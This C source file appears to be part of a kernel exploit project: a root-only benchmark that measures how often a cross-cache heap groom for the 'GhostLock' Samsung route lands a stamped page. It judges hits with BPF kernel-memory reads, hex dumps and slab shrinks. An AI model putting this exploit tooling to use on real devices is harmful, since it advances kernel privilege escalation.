/* cves/bench/crosscache_samsung.c -- cross-cache landing rate on a build with
 * no usable kprobe read, judged by the panic-safe BPF perf-event read.
 *
 * It places a page through the shared crosscache "stream" method -- the same
 * reclaim path GhostLock's Samsung route uses -- writing a magic stamp into
 * every fragment through the shared send-buffer->page mapping (skb_payload.h,
 * the same mapping GhostLock's forge uses), then reading that stamp back from
 * the kernel address the mapping places it at, with lib_bpf_read. If the
 * magic is there, our composed page won the reclaimed slot (LANDED); if not,
 * a foreign object did (missed). Root is the judge only; --compact drives
 * buddy compaction before each round.
 *
 * This is the Samsung counterpart of cves/bench/crosscache.c, which uses the
 * kprobe read and Pixel-only measurement tools that do not apply here.
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "../lib/spray/crosscache/crosscache.h"
#include "../lib/spray/crosscache/skb_payload.h"
#include "../lib/leak/kernelsnitch/kernelsnitch.h" /* kernelsnitch_collisions_wanted */
#include "../lib/rw/bpf_read.h"
#include "../lib/target.h" /* MM_STRUCT_SZ / MM_ORDER from the target header */

/* Mirror of GhostLock's Samsung config (cve-2026-43499-ghostlock/common.h) so
 * the bench places through crosscache identically to the real route. */
#ifndef MM_PARTIALS
#define MM_PARTIALS 5
#endif
#ifndef CORE
#define CORE 0
#endif
#define ORDER3_SIZE      (4096u << 3)
#define SKB_SEND_SIZE    (ORDER3_SIZE * 2)
/* The chain's own refill count, from the same target header the chain reads, so
 * the bench keeps measuring what the route does rather than a number that has
 * to be kept in step by hand. */
#ifndef SKB_RECLAIM_SENDS
#define SKB_RECLAIM_SENDS 4
#endif
#define BENCH_NSPRAY     SKB_RECLAIM_SENDS
/* A page offset well inside every reclaiming fragment; the stamp goes there in
 * each fragment via the shared lib mapping (skb_payload.h), and is read back
 * from the kernel address that mapping puts it at -- so the judge measures the
 * exact same placement GhostLock's forge uses, not a guessed offset. */
#define STAMP_OFF        0x100
#define STAMP_MAGIC      0x43524f53534c4e44ULL /* "CROSSLND" */

/* The Samsung sockopt vehicle is narrow geometry: payload delta 0, fragment
 * bias 0xe80 (cve-2026-43499-ghostlock/util.c's compose_fake_fops_page). */
#define BENCH_SKB_DELTA  0
#define BENCH_SKB_BIAS   0xe80

static void compose_stamp(void *payload, size_t len, uintptr_t base,
                          void *user) {
  (void)user;
  memset(payload, 0, len);
  struct lib_skb_place sp;
  lib_skb_place_init(&sp, base, BENCH_SKB_DELTA, BENCH_SKB_BIAS, len,
                     ORDER3_SIZE);
  lib_skb_place_put64(&sp, payload, STAMP_OFF, STAMP_MAGIC);
}

/* Search a window around `base` for STAMP_MAGIC and report where it landed --
 * calibration: if the magic is found at base+Y, the page WAS reclaimed by us
 * and the true data offset is Y (our bias assumption is Y off); if it is found
 * nowhere, the reclaim genuinely missed the page. */
static void scan_for_magic(struct lib_bpf_read *bpf, uintptr_t base) {
  long lo = -0x2000, hi = ORDER3_SIZE + 0x2000;
  int found = 0;
  for (long off = lo; off + 8 <= hi; off += 8) {
    uint64_t v = 0;
    if (lib_bpf_read(bpf, (uint64_t)((intptr_t)base + off), &v, 8) == 8 &&
        v == STAMP_MAGIC) {
      printf("    SCAN: magic found at base%+ld (0x%lx)\n", off,
             (unsigned long)((intptr_t)base + off));
      found = 1;
    }
  }
  if (!found) {
    printf("    SCAN: magic NOT found in [base-0x2000, base+0x%x] -- page not "
           "reclaimed by us\n",
           (unsigned)(ORDER3_SIZE + 0x2000));
  }
}

static int root_compact(void) {
  int fd = open("/proc/sys/vm/compact_memory", O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }
  ssize_t n = write(fd, "1\n", 2);
  close(fd);
  return n == 2 ? 0 : -1;
}

/* Print the lines of a /proc file whose text contains any of `keys`. */
static void dump_proc_lines(const char *path, const char *const *keys,
                            int nkeys) {
  FILE *f = fopen(path, "r");
  if (!f) {
    printf("  (%s unreadable)\n", path);
    return;
  }
  char line[1024];
  while (fgets(line, sizeof(line), f)) {
    for (int i = 0; i < nkeys; i++) {
      if (strstr(line, keys[i])) {
        line[strcspn(line, "\n")] = '\0';
        printf("  [%s] %s\n", path, line);
        break;
      }
    }
  }
  fclose(f);
}

/* Parse one number out of /proc/slabinfo's mm_struct line: active_objs (col 2),
 * num_objs (col 3), or active_slabs (the token after "slabdata"). Returns -1 if
 * the line or field is not found. */
static long slabinfo_mm_field(const char *which) {
  FILE *f = fopen("/proc/slabinfo", "r");
  if (!f) {
    return -1;
  }
  char line[1024];
  long val = -1;
  while (fgets(line, sizeof(line), f)) {
    if (strncmp(line, "mm_struct ", 10) != 0) {
      continue;
    }
    char *tok = strtok(line, " \t");
    int col = 0;
    for (; tok; tok = strtok(NULL, " \t"), col++) {
      if (!strcmp(which, "active_objs") && col == 1) {
        val = atol(tok);
        break;
      }
      if (!strcmp(which, "num_objs") && col == 2) {
        val = atol(tok);
        break;
      }
      if (!strcmp(which, "active_slabs") && !strcmp(tok, "slabdata")) {
        char *n = strtok(NULL, " \t");
        val = n ? atol(n) : -1;
        break;
      }
    }
    break;
  }
  fclose(f);
  return val;
}

/* The order-`order` free-block count of zone Normal from /proc/buddyinfo. The
 * freed mm slab is order MM_ORDER; when it reaches the buddy allocator this
 * count rises. Returns -1 if not found. */
static long buddyinfo_normal_order(int order) {
  FILE *f = fopen("/proc/buddyinfo", "r");
  if (!f) {
    return -1;
  }
  char line[1024];
  long val = -1;
  while (fgets(line, sizeof(line), f)) {
    char *z = strstr(line, "Normal");
    if (!z) {
      continue;
    }
    char *tok = strtok(z + 6, " \t\n"); /* first order-0 count after "Normal" */
    for (int i = 0; tok && i <= order; tok = strtok(NULL, " \t\n"), i++) {
      if (i == order) {
        val = atol(tok);
        break;
      }
    }
    break;
  }
  fclose(f);
  return val;
}

/* One concise line the mm_partials sweep and the force-free test are read by:
 * the mm_struct slab's fill and the buddy order-MM_ORDER supply, before the
 * groom and after the reclaim, so a page leaving the slab for the buddy shows as
 * slabdata falling and order-MM_ORDER rising in the same round. */
static void slab_buddy_summary(const char *when) {
  printf("  [%s] mm_struct active=%ld num=%ld slabdata=%ld | buddy Normal "
         "o%d=%ld o%d=%ld o%d=%ld\n",
         when, slabinfo_mm_field("active_objs"), slabinfo_mm_field("num_objs"),
         slabinfo_mm_field("active_slabs"), MM_ORDER - 1,
         buddyinfo_normal_order(MM_ORDER - 1), MM_ORDER,
         buddyinfo_normal_order(MM_ORDER), MM_ORDER + 1,
         buddyinfo_normal_order(MM_ORDER + 1));
}

/* Force the emptied mm_struct slab back to the buddy allocator, as root, in the
 * cross-cache window between the free and the refill (the CROSSCACHE_STAGE_FREED
 * inspection). SLUB's per-cache `shrink` releases every slab with no live
 * object; if the page not reaching the buddy allocator is what the refill is
 * missing, doing this here should let the sk_buff refill reclaim it. Returns 1
 * done, -1 if the sysfs write failed. */
static int force_free_mm_slab(void) {
  int fd = open("/sys/kernel/slab/mm_struct/shrink", O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }
  ssize_t n = write(fd, "1\n", 2);
  close(fd);
  return n == 2 ? 1 : -1;
}

/* Carried through crosscache_request.user to both compose (ignored there) and
 * the inspect callback. */
struct bench_ctx {
  int force_free;   /* fire the root shrink at CROSSCACHE_STAGE_FREED */
  int shrink_rc;    /* result of the last shrink: 1 done, -1 failed, 0 not run */
};

static void bench_inspect(enum crosscache_stage stage, uintptr_t leaked,
                          uintptr_t base, void *user) {
  (void)leaked;
  (void)base;
  struct bench_ctx *bc = user;
  if (stage != CROSSCACHE_STAGE_FREED || !bc || !bc->force_free) {
    return;
  }
  bc->shrink_rc = force_free_mm_slab();
}

/* mm_struct is the freed cross-cache unit; the reclaim wants a matching-order
 * page. skbuff/kmalloc are where the sk_buff refill would land instead. */
static void dump_slab_and_buddy(void) {
  static const char *slab_keys[] = { "mm_struct", "skbuff", "kmalloc-cg-8k",
                                     "kmalloc-8k", "pipe" };
  static const char *buddy_keys[] = { "Normal", "DMA" };
  dump_proc_lines("/proc/slabinfo", slab_keys,
                  sizeof(slab_keys) / sizeof(slab_keys[0]));
  dump_proc_lines("/proc/buddyinfo", buddy_keys,
                  sizeof(buddy_keys) / sizeof(buddy_keys[0]));
}

/* Hex-dump `len` bytes at a kernel address via BPF, 8 bytes/line, so the actual
 * content of the page we targeted is visible -- our forge if it landed, or the
 * foreign object that took it instead. */
static void bpf_hexdump(struct lib_bpf_read *bpf, uint64_t addr, size_t len,
                        const char *what) {
  printf("    %s @%#lx:\n", what, (unsigned long)addr);
  for (size_t off = 0; off < len; off += 8) {
    uint64_t v = 0;
    if (lib_bpf_read(bpf, addr + off, &v, 8) != 8) {
      printf("      +%03zx: <unreadable>\n", off);
      break;
    }
    printf("      +%03zx: %016lx%s\n", off, (unsigned long)v,
           v == STAMP_MAGIC ? "  <- OUR STAMP" : "");
  }
}

int main(int argc, char **argv) {
  setvbuf(stdout, NULL, _IONBF, 0);
  int rounds = 20, compact = 0, scan = 0, debug = 0, force_free = 0;
  const char *method = "stream"; /* stream/direct/swap take our compose */
  size_t send_bytes = SKB_SEND_SIZE;
  size_t nspray = BENCH_NSPRAY;
  long mm_partials = MM_PARTIALS;
  /* Default to the target's own drain counts (the same MM_DRAIN_LATE GhostLock
   * uses), so a bare run measures the real drained path; --drain-late 0 opts
   * out for the undrained-baseline comparison. */
  long drain_early = MM_DRAIN_EARLY, drain_late = MM_DRAIN_LATE;
  for (int i = 1; i < argc; i++) {
    if (!strcmp(argv[i], "--rounds") && i + 1 < argc) {
      rounds = atoi(argv[++i]);
      if (rounds < 1) {
        rounds = 1;
      }
    } else if (!strcmp(argv[i], "--compact")) {
      compact = 1;
    } else if (!strcmp(argv[i], "--scan")) {
      scan = 1;
    } else if (!strcmp(argv[i], "--debug")) {
      debug = 1;
    } else if (!strcmp(argv[i], "--force-free")) {
      force_free = 1;
    } else if (!strcmp(argv[i], "--mm-partials") && i + 1 < argc) {
      mm_partials = strtol(argv[++i], NULL, 0);
      if (mm_partials < 0) {
        mm_partials = 0;
      }
    } else if (!strcmp(argv[i], "--drain-early") && i + 1 < argc) {
      drain_early = strtol(argv[++i], NULL, 0);
      if (drain_early < 0) {
        drain_early = 0;
      }
    } else if (!strcmp(argv[i], "--drain-late") && i + 1 < argc) {
      drain_late = strtol(argv[++i], NULL, 0);
      if (drain_late < 0) {
        drain_late = 0;
      }
    } else if (!strcmp(argv[i], "--method") && i + 1 < argc) {
      method = argv[++i];
    } else if (!strcmp(argv[i], "--send-size") && i + 1 < argc) {
      send_bytes = (size_t)strtoul(argv[++i], NULL, 0);
    } else if (!strcmp(argv[i], "--nspray") && i + 1 < argc) {
      nspray = (size_t)strtoul(argv[++i], NULL, 0);
    }
  }
  /* The force-free shrink lands only when the mm slab it empties has no
   * partial-retention floor holding the page; seed no extra partials so the
   * target slab can empty. mm_partials>0 and --force-free together measure the
   * opposite, deliberately. */
  int per_round_summary = debug || force_free || drain_early || drain_late;

  if (geteuid() != 0) {
    fprintf(stderr, "BENCH_GATE_FAIL: must run as root\n");
    return 2;
  }

  struct lib_bpf_read bpf;
  if (lib_bpf_read_open(&bpf) != 0) {
    fprintf(stderr, "BENCH_GATE_FAIL: bpf read unavailable\n");
    return 2;
  }

  struct crosscache_cfg cfg;
  memset(&cfg, 0, sizeof(cfg));
  cfg.mm_struct_sz = MM_STRUCT_SZ;
  cfg.mm_order = MM_ORDER;
  cfg.mm_partials = (size_t)mm_partials;
  cfg.drain_early = (size_t)drain_early;
  cfg.drain_late = (size_t)drain_late;
  cfg.leak_collisions = kernelsnitch_collisions_wanted();
  cfg.core = CORE;

  struct bench_ctx bc;
  memset(&bc, 0, sizeof(bc));
  bc.force_free = force_free;

  struct crosscache_request req;
  memset(&req, 0, sizeof(req));
  req.cfg = cfg;
  req.compose = compose_stamp;
  req.inspect = force_free ? bench_inspect : NULL;
  req.user = &bc;
  req.send_bytes = send_bytes;
  req.nspray = nspray;

  const struct crosscache_method *m = crosscache_method_named(method);
  if (!m) {
    fprintf(stderr, "BENCH_GATE_FAIL: no stream method\n");
    lib_bpf_read_close(&bpf);
    return 2;
  }

  printf("crosscache-samsung: method=%s rounds=%d compact=%d force_free=%d mm_partials=%ld drain=%ld/%ld send=%#zx nspray=%zu mm_struct_sz=%#x mm_order=%d\n",
         method, rounds, compact, force_free, mm_partials, drain_early,
         drain_late, send_bytes, nspray, (unsigned)MM_STRUCT_SZ, MM_ORDER);
  if (debug) {
    printf("baseline slab/buddy:\n");
    dump_slab_and_buddy();
  }

  int placed = 0, judged = 0, landed = 0;
  for (int r = 0; r < rounds; r++) {
    if (compact) {
      root_compact();
    }
    if (per_round_summary) {
      slab_buddy_summary("pre-groom");
    }
    uintptr_t base = crosscache_place_with(m, &req);
    if (!base) {
      printf("round %d: placement returned 0 (leak/groom failed)\n", r);
    } else {
      placed++;
      struct lib_skb_place sp;
      lib_skb_place_init(&sp, base, BENCH_SKB_DELTA, BENCH_SKB_BIAS,
                         send_bytes, ORDER3_SIZE);
      uint64_t addr = lib_skb_place_addr(&sp, STAMP_OFF);
      uint64_t val = 0;
      if (lib_bpf_read(&bpf, addr, &val, 8) == 8) {
        judged++;
        int hit = (val == STAMP_MAGIC);
        if (hit) {
          landed++;
        }
        printf("round %d: base=%#lx read@%#lx=%016lx -> %s%s\n", r,
               (unsigned long)base, (unsigned long)addr, (unsigned long)val,
               hit ? "LANDED" : "missed",
               force_free ? (bc.shrink_rc == 1 ? " [shrink ok]"
                             : bc.shrink_rc == -1 ? " [shrink FAILED]"
                                                  : " [shrink not run]")
                          : "");
      } else {
        printf("round %d: base=%#lx read@%#lx unreadable\n", r,
               (unsigned long)base, (unsigned long)addr);
      }
      if (scan) {
        scan_for_magic(&bpf, base);
      }
      if (debug) {
        bpf_hexdump(&bpf, base, 0x80, "page at target base");
        if (r == 0) {
          printf("  slab/buddy right after reclaim:\n");
          dump_slab_and_buddy();
        }
      }
    }
    if (per_round_summary) {
      slab_buddy_summary("post-reclaim");
    }
    crosscache_cleanup();
  }
  lib_bpf_read_close(&bpf);

  printf("CROSSCACHE_BENCH_JUDGED rounds=%d placed=%d judged=%d landed=%d\n",
         rounds, placed, judged, landed);
  printf("RESULT method=%s send=%#zx nspray=%zu compact=%d force_free=%d mm_partials=%ld drain=%ld/%ld judged=%d landed=%d rate=%d%%\n",
         method, send_bytes, nspray, compact, force_free, mm_partials,
         drain_early, drain_late, judged, landed,
         judged ? landed * 100 / judged : 0);
  return 0;
}
